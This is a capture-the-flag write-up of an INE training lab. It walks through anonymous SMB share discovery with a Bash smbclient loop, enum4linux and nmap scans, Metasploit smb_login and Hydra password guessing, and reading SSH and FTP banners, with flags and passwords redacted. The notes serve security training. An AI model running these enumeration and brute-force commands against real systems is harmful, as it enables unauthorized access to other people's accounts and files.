# Lab Notes: Assessment Methodologies — Enumeration CTF 1

## 1. Lab Information

- **Platform:** INE
- **Lab:** Assessment Methodologies: Enumeration CTF 1
- **Target hostname:** `target.ine.local`
- **Target IP:** `192.170.178.3`
- **Objective:** Enumerate available services and retrieve four flags.

**Redaction notice:** Actual flag values and passwords are omitted from these notes.

---

## Flag 1: Anonymous SMB Share

### Step 1: Create the share-enumeration script

The script checks possible SMB share names from a wordlist and reports shares that allow anonymous access.

```bash
#!/bin/bash

wordlist="/root/Desktop/wordlists/shares.txt"

while read -r share; do
    smbclient -N -U "" "//target.ine.local/$share" &>/dev/null
    if [ $? -eq 0 ]; then
        echo "--------- Share with anonymous access found: $share"
    fi
done < "$wordlist"
```

**Explanation:**

- `#!/bin/bash` — specifies Bash as the script interpreter.
- `wordlist=...` — defines the path to the share-name wordlist.
- `while read -r share` — reads each candidate share name.
- `smbclient` — attempts to connect to an SMB share.
- `-N` — suppresses the password prompt.
- `-U ""` — supplies an empty username.
- `//target.ine.local/$share` — constructs the target share path.
- `&>/dev/null` — suppresses standard output and error output from each attempt.
- `$?` — checks the exit status of the previous command.
- `done < "$wordlist"` — reads candidates from the specified wordlist.

### Step 2: Make the script executable and run it

```bash
chmod +x scriptnum
./scriptnum
```

**Explanation:**

- `chmod +x scriptnum` — adds execute permission to the script.
- `./scriptnum` — executes the script from the current directory. The `./` prefix explicitly refers to a file in that directory.

The script identified the `pubfiles` share as permitting anonymous access.

### Step 3: Connect to the discovered share

```bash
smbclient -N //target.ine.local/pubfiles
```

**Explanation:**

- `smbclient` — starts the SMB client.
- `-N` — attempts the connection without prompting for a password.
- `//target.ine.local/pubfiles` — identifies the target and share.

### Step 4: List and download the flag file

Inside the SMB session:

```text
ls
get flag1.txt
```

- `ls` — lists files in the remote share.
- `get flag1.txt` — downloads the specified file to the local machine.

After exiting the SMB session, read the downloaded file:

```bash
cat flag1.txt
```

The first flag was retrieved. Its value is redacted.

**Finding:** The `pubfiles` share allowed anonymous access and exposed a flag file.

---

## Flag 2: Samba User Enumeration and Weak Credentials

### Step 1: Enumerate Samba information

```bash
enum4linux target.ine.local
```

- `enum4linux` — collects SMB information, including user accounts, workgroup information, shares, and password-policy details.
- `target.ine.local` — specifies the target hostname.

The output identified the workgroup as `WORKGROUP`, revealed several user accounts, and indicated that sessions using an empty username and password were permitted. Some share-listing operations encountered SMBv1 negotiation limitations.

### Step 2: Scan services and versions

```bash
nmap -sV -sC -Pn target.ine.local
```

- `nmap` — scans the target.
- `-sV` — attempts to identify service versions.
- `-sC` — runs Nmap's default script set.
- `-Pn` — skips host discovery and treats the target as online.
- `target.ine.local` — specifies the target hostname.

The scan identified SSH and Samba services. FTP was not discovered on its default port during this scan.

### Step 3: Use Metasploit's SMB login scanner

Start Metasploit:

```text
msfconsole
```

Search for the module:

```text
search smb_login
```

Select it:

```text
use auxiliary/scanner/smb/smb_login
```

Configure and run the scanner:

```text
set VERBOSE false
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
set RHOST target.ine.local
set USER_FILE /root/Desktop/user.txt
run
```

- `msfconsole` — opens the Metasploit console.
- `search smb_login` — searches for SMB login-testing modules.
- `use auxiliary/scanner/smb/smb_login` — selects the SMB login scanner.
- `set VERBOSE false` — reduces detailed output.
- `set PASS_FILE ...` — specifies the password wordlist.
- `set RHOST ...` — specifies the remote target.
- `set USER_FILE ...` — specifies the username wordlist.
- `run` — executes the configured module.

The scanner identified valid lab credentials. Passwords are intentionally omitted.

### Step 4: Access the user's private share

```bash
smbclient //target.ine.local/josh -U josh
```

- `smbclient` — connects to the SMB service.
- `//target.ine.local/josh` — specifies the share named `josh`.
- `-U josh` — supplies `josh` as the username. The client prompts for the password.

Inside the SMB session:

```text
ls
get flag2.txt
```

Read the downloaded file locally:

```bash
cat flag2.txt
```

The second flag was retrieved. Its value is redacted. The file provided a hint to find an FTP service and inspect its banner.

**Finding:** Samba user enumeration and weak credentials enabled access to a private share.

---

## Flag 3: FTP on a Non-Standard Port

### Step 1: Check the default FTP port

```bash
ftp target.ine.local
```

The connection was refused. The FTP service was subsequently discovered on a different port.

### Step 2: Connect to port 5554

```bash
ftp target.ine.local 5554
```

- `ftp` — starts the FTP client.
- `target.ine.local` — specifies the target hostname.
- `5554` — specifies the non-standard port.

The service banner warned several named users to change their weak passwords. This provided a clue for further enumeration.

### Step 3: Test the indicated account using Hydra

```bash
hydra -l alice -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
```

- `hydra` — runs a network login-testing tool.
- `-l alice` — specifies the username to test.
- `-P /root/Desktop/wordlists/unix_passwords.txt` — supplies a password wordlist. Uppercase `-P` means a password file; lowercase `-p` specifies a single password.
- `ftp://target.ine.local:5554` — identifies the FTP service and port.

The test identified a valid lab password. The password is redacted.

### Step 4: Log in and retrieve the flag

```bash
ftp target.ine.local 5554
```

Enter the discovered username and password when prompted. Inside the FTP session:

```text
ls
get flag3.txt
```

Then read the downloaded file locally:

```bash
cat flag3.txt
```

The third flag was retrieved. Its value is redacted.

**Finding:** FTP was accessible on TCP port `5554`, and the service banner provided useful usernames and a password-strength warning.

---

## Flag 4: SSH Warning Banner

### Step 1: Connect to SSH

```bash
ssh target.ine.local
```

- `ssh` — starts an SSH client connection.
- `target.ine.local` — specifies the target hostname.
- SSH uses TCP port `22` by default unless another port is configured.

During the connection attempt, the server displayed a warning banner intended to deter unauthorized access. The banner contained the information required for the fourth flag. The flag value and sensitive banner details are redacted.

**Finding:** The SSH connection banner exposed information relevant to the final flag.

---

## Summary

| Flag | Technique | Result |
|---|---|---|
| 1 | Anonymous SMB share enumeration | Retrieved a flag file from `pubfiles` |
| 2 | Samba enumeration and weak-credential testing | Accessed a private share |
| 3 | FTP banner inspection and credential testing | Retrieved a flag file over port `5554` |
| 4 | SSH banner inspection | Identified the final flag information |

## Key Lessons

- Enumerate SMB shares instead of assuming all shares require authentication.
- Use service-enumeration tools to identify users, shares, and available services.
- Check alternative ports when a clue suggests a service is not running on its default port.
- Read banners carefully; they can reveal useful information.
- Understand every command and option before using it.
- Keep flags and passwords out of public write-ups.

## Disclaimer

These notes document an authorized INE training lab for educational purposes. Do not test systems without permission. Review INE's current publication rules before sharing detailed lab solutions publicly.
